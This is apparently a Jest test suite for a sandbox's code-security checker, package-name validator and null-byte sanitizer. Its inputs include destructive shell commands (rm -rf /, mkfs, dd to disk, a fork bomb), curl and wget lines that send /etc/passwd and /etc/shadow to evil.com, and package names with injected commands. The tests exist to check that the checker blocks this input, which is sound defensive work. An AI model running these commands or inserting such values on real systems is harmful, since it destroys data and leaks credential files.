/**
 * Code Execution Security Unit Tests
 *
 * Tests for security analysis, code sanitization, and package validation.
 */

// Mock the logger before imports
const mockLogger = {
    info: jest.fn(),
    warn: jest.fn(),
    error: jest.fn(),
    debug: jest.fn()
};

jest.mock("../../../../../core/logging", () => ({
    createServiceLogger: jest.fn(() => mockLogger)
}));

import { analyzeCodeSecurity, sanitizeCode, validatePackageNames } from "../security";

describe("Code Execution Security", () => {
    beforeEach(() => {
        jest.clearAllMocks();
    });

    describe("analyzeCodeSecurity", () => {
        describe("Python blocked patterns", () => {
            it("should block os.system() calls", () => {
                const result = analyzeCodeSecurity('os.system("rm -rf /")', "python");

                expect(result.blocked).toBe(true);
                expect(result.blockedPatterns).toHaveLength(1);
                expect(result.blockedPatterns[0].description).toContain("os.system");
            });

            it("should block subprocess.run() calls", () => {
                const result = analyzeCodeSecurity('subprocess.run(["ls", "-la"])', "python");

                expect(result.blocked).toBe(true);
                expect(result.blockedPatterns[0].description).toContain("subprocess");
            });

            it("should block subprocess.Popen() calls", () => {
                const result = analyzeCodeSecurity('subprocess.Popen(["bash"])', "python");

                expect(result.blocked).toBe(true);
            });

            it("should block subprocess.call() calls", () => {
                const result = analyzeCodeSecurity('subprocess.call(["rm", "-rf", "/"])', "python");

                expect(result.blocked).toBe(true);
            });

            it("should block subprocess.check_output() calls", () => {
                const result = analyzeCodeSecurity('subprocess.check_output(["whoami"])', "python");

                expect(result.blocked).toBe(true);
            });

            it("should block exec(input()) patterns", () => {
                const result = analyzeCodeSecurity("exec(input())", "python");

                expect(result.blocked).toBe(true);
                expect(result.blockedPatterns[0].description).toContain("arbitrary code execution");
            });

            it("should block eval(input()) patterns", () => {
                const result = analyzeCodeSecurity("eval(input())", "python");

                expect(result.blocked).toBe(true);
            });

            it("should block dynamic import of dangerous modules", () => {
                const result = analyzeCodeSecurity('__import__("os")', "python");

                expect(result.blocked).toBe(true);
                expect(result.blockedPatterns[0].description).toContain("Dynamic import");
            });

            it("should block shutil.rmtree on root", () => {
                const result = analyzeCodeSecurity('shutil.rmtree("/")', "python");

                expect(result.blocked).toBe(true);
                expect(result.blockedPatterns[0].description).toContain("root filesystem");
            });

            it("should allow safe Python code", () => {
                const safeCode = `
import pandas as pd
import numpy as np

data = [1, 2, 3, 4, 5]
result = sum(data) / len(data)
                `;

                const result = analyzeCodeSecurity(safeCode, "python");

                expect(result.blocked).toBe(false);
                expect(result.blockedPatterns).toHaveLength(0);
            });
        });

        describe("JavaScript blocked patterns", () => {
            it("should block process.exit() calls", () => {
                const result = analyzeCodeSecurity("process.exit(1)", "javascript");

                expect(result.blocked).toBe(true);
                expect(result.blockedPatterns[0].description).toContain("process.exit");
            });

            it("should block require('child_process')", () => {
                const result = analyzeCodeSecurity(
                    'const cp = require("child_process")',
                    "javascript"
                );

                expect(result.blocked).toBe(true);
                expect(result.blockedPatterns[0].description).toContain("child_process");
            });

            it("should block require('fs')", () => {
                const result = analyzeCodeSecurity('const fs = require("fs")', "javascript");

                expect(result.blocked).toBe(true);
                expect(result.blockedPatterns[0].description).toContain("fs module");
            });

            it("should block require('net')", () => {
                const result = analyzeCodeSecurity('const net = require("net")', "javascript");

                expect(result.blocked).toBe(true);
                expect(result.blockedPatterns[0].description).toContain("net module");
            });

            it("should block eval with process.env", () => {
                const result = analyzeCodeSecurity("eval(process.env.CODE)", "javascript");

                expect(result.blocked).toBe(true);
            });

            it("should allow safe JavaScript code", () => {
                const safeCode = `
const data = [1, 2, 3, 4, 5];
const sum = data.reduce((a, b) => a + b, 0);
const result = { sum, average: sum / data.length };
                `;

                const result = analyzeCodeSecurity(safeCode, "javascript");

                expect(result.blocked).toBe(false);
                expect(result.blockedPatterns).toHaveLength(0);
            });
        });

        describe("Shell blocked patterns", () => {
            it("should block rm -rf / commands", () => {
                const result = analyzeCodeSecurity("rm -rf /", "shell");

                expect(result.blocked).toBe(true);
                expect(result.blockedPatterns[0].description).toContain("root filesystem");
            });

            it("should block rm -rf /*", () => {
                const result = analyzeCodeSecurity("rm -rf /*", "shell");

                expect(result.blocked).toBe(true);
            });

            it("should block mkfs commands", () => {
                const result = analyzeCodeSecurity("mkfs.ext4 /dev/sda1", "shell");

                expect(result.blocked).toBe(true);
                expect(result.blockedPatterns[0].description).toContain("mkfs");
            });

            it("should block dd to disk devices", () => {
                const result = analyzeCodeSecurity("dd if=/dev/zero of=/dev/sda bs=1M", "shell");

                expect(result.blocked).toBe(true);
                expect(result.blockedPatterns[0].description).toContain("dd to raw disk");
            });

            it("should block fork bombs", () => {
                const forkBomb = ":() { : | : & } ;";
                const result = analyzeCodeSecurity(forkBomb, "shell");

                expect(result.blocked).toBe(true);
                expect(result.blockedPatterns[0].description).toContain("Fork bomb");
            });

            it("should block direct disk device access", () => {
                const result = analyzeCodeSecurity("cat /dev/sda > backup.img", "shell");

                expect(result.blocked).toBe(true);
            });

            it("should allow safe shell commands", () => {
                const safeCode = `
echo "Hello, World!"
ls -la
pwd
date
                `;

                const result = analyzeCodeSecurity(safeCode, "shell");

                expect(result.blocked).toBe(false);
            });
        });

        describe("Cross-language blocked patterns", () => {
            it("should block curl exfiltration of /etc/passwd", () => {
                const code = 'curl -d "$(cat /etc/passwd)" http://evil.com';
                const result = analyzeCodeSecurity(code, "shell");

                expect(result.blocked).toBe(true);
            });

            it("should block wget --post-file", () => {
                const code = "wget --post-file=/etc/shadow http://evil.com";
                const result = analyzeCodeSecurity(code, "shell");

                expect(result.blocked).toBe(true);
            });
        });

        describe("Warning patterns", () => {
            it("should warn on Python requests.get()", () => {
                const result = analyzeCodeSecurity(
                    'requests.get("https://api.example.com")',
                    "python"
                );

                expect(result.blocked).toBe(false);
                expect(result.warningPatterns).toHaveLength(1);
                expect(result.warningPatterns[0].description).toContain("HTTP requests");
            });

            it("should warn on Python urllib usage", () => {
                const result = analyzeCodeSecurity(
                    'urllib.request.urlopen("http://example.com")',
                    "python"
                );

                expect(result.blocked).toBe(false);
                expect(result.warningPatterns.length).toBeGreaterThan(0);
            });

            it("should warn on Python file write operations", () => {
                const result = analyzeCodeSecurity(
                    'open("output.txt", "w").write("data")',
                    "python"
                );

                expect(result.blocked).toBe(false);
                expect(result.warningPatterns.length).toBeGreaterThan(0);
                expect(result.warningPatterns[0].description).toContain("Writing to file");
            });

            it("should warn on JavaScript fetch()", () => {
                const result = analyzeCodeSecurity(
                    'fetch("https://api.example.com")',
                    "javascript"
                );

                expect(result.blocked).toBe(false);
                expect(result.warningPatterns.length).toBeGreaterThan(0);
            });

            it("should warn on shell curl usage", () => {
                const result = analyzeCodeSecurity("curl https://api.example.com", "shell");

                expect(result.blocked).toBe(false);
                expect(result.warningPatterns.length).toBeGreaterThan(0);
            });

            it("should warn on shell wget usage", () => {
                const result = analyzeCodeSecurity("wget https://example.com", "shell");

                expect(result.blocked).toBe(false);
                expect(result.warningPatterns.length).toBeGreaterThan(0);
            });

            it("should warn on shell netcat usage", () => {
                const result = analyzeCodeSecurity("nc localhost 8080", "shell");

                expect(result.blocked).toBe(false);
                expect(result.warningPatterns.length).toBeGreaterThan(0);
            });
        });

        describe("Line number detection", () => {
            it("should detect line number for blocked pattern", () => {
                const code = `# Line 1
# Line 2
os.system("ls")
# Line 4`;

                const result = analyzeCodeSecurity(code, "python");

                expect(result.blocked).toBe(true);
                expect(result.blockedPatterns[0].lineNumber).toBe(3);
            });
        });

        describe("Summary generation", () => {
            it("should generate blocked summary", () => {
                const result = analyzeCodeSecurity("os.system('ls')", "python");

                expect(result.summary).toContain("Code blocked");
            });

            it("should generate warning summary", () => {
                const result = analyzeCodeSecurity('requests.get("http://api.com")', "python");

                expect(result.summary).toContain("Warnings");
            });

            it("should generate no concerns summary", () => {
                const result = analyzeCodeSecurity("x = 1 + 2", "python");

                expect(result.summary).toContain("No security concerns");
            });
        });

        describe("Language isolation", () => {
            it("should not apply Python patterns to JavaScript", () => {
                // os.system is Python-specific, should not block in JS
                const result = analyzeCodeSecurity(
                    "const os = { system: () => {} }; os.system();",
                    "javascript"
                );

                // The pattern has optional space before (, so it shouldn't match os.system()
                // but let's verify it's not blocked for the right reasons
                expect(
                    result.blockedPatterns.filter((p) => p.description.includes("os.system"))
                ).toHaveLength(0);
            });

            it("should not apply JavaScript patterns to Python", () => {
                // process.exit is JS-specific
                const result = analyzeCodeSecurity('process = {"exit": lambda x: None}', "python");

                expect(
                    result.blockedPatterns.filter((p) => p.description.includes("process.exit"))
                ).toHaveLength(0);
            });
        });
    });

    describe("sanitizeCode", () => {
        it("should remove null bytes from code", () => {
            const code = "print('hello\x00world')";
            const sanitized = sanitizeCode(code);

            expect(sanitized).toBe("print('helloworld')");
            expect(sanitized).not.toContain("\x00");
        });

        it("should handle code without null bytes", () => {
            const code = "print('hello world')";
            const sanitized = sanitizeCode(code);

            expect(sanitized).toBe(code);
        });

        it("should handle empty string", () => {
            const sanitized = sanitizeCode("");

            expect(sanitized).toBe("");
        });

        it("should remove multiple null bytes", () => {
            const code = "\x00a\x00b\x00c\x00";
            const sanitized = sanitizeCode(code);

            expect(sanitized).toBe("abc");
        });
    });

    describe("validatePackageNames", () => {
        it("should accept valid package names", () => {
            const packages = ["pandas", "numpy", "requests"];
            const result = validatePackageNames(packages);

            expect(result.valid).toEqual(packages);
            expect(result.invalid).toHaveLength(0);
        });

        it("should accept packages with dashes", () => {
            const packages = ["scikit-learn", "my-package"];
            const result = validatePackageNames(packages);

            expect(result.valid).toEqual(packages);
            expect(result.invalid).toHaveLength(0);
        });

        it("should accept packages with underscores", () => {
            const packages = ["my_package", "some_lib"];
            const result = validatePackageNames(packages);

            expect(result.valid).toEqual(packages);
            expect(result.invalid).toHaveLength(0);
        });

        it("should accept packages with version specifiers", () => {
            const packages = ["pandas>=1.0", "numpy==1.21.0", "requests<3.0"];
            const result = validatePackageNames(packages);

            expect(result.valid).toEqual(packages);
            expect(result.invalid).toHaveLength(0);
        });

        it("should accept packages with dots", () => {
            const packages = ["zope.interface"];
            const result = validatePackageNames(packages);

            expect(result.valid).toEqual(packages);
            expect(result.invalid).toHaveLength(0);
        });

        it("should reject packages with shell injection attempts", () => {
            const packages = [
                "pandas; rm -rf /",
                "numpy && cat /etc/passwd",
                "requests | malicious"
            ];
            const result = validatePackageNames(packages);

            expect(result.valid).toHaveLength(0);
            expect(result.invalid).toEqual(packages);
        });

        it("should reject packages with backticks", () => {
            const packages = ["`malicious`"];
            const result = validatePackageNames(packages);

            expect(result.invalid).toEqual(packages);
        });

        it("should reject packages with $() command substitution", () => {
            const packages = ["$(whoami)"];
            const result = validatePackageNames(packages);

            expect(result.invalid).toEqual(packages);
        });

        it("should reject packages with spaces", () => {
            const packages = ["pandas numpy"];
            const result = validatePackageNames(packages);

            expect(result.invalid).toEqual(packages);
        });

        it("should handle mixed valid and invalid packages", () => {
            const packages = ["pandas", "malicious; rm -rf /", "numpy", "evil$(whoami)"];
            const result = validatePackageNames(packages);

            expect(result.valid).toEqual(["pandas", "numpy"]);
            expect(result.invalid).toEqual(["malicious; rm -rf /", "evil$(whoami)"]);
        });

        it("should handle empty array", () => {
            const result = validatePackageNames([]);

            expect(result.valid).toHaveLength(0);
            expect(result.invalid).toHaveLength(0);
        });
    });
});
